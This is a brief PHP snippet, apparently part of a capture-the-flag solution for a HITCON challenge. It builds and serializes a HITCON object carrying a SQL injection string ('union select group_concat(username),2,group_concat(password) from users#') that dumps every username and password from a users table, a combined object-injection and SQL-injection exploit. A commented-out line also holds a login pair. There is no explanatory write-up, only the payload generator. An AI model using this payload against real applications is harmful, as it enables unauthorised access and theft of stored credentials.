...
/*$flag=new HITCON("login",$my_array = array("orange","123"),"");
$a=serialize($flag);
echo $a;
*/
$flag=new HITCON("show",$my_array = array("' union select group_concat(username),2,group_concat(password) from users#"),"");
$a=serialize($flag);
echo $a;
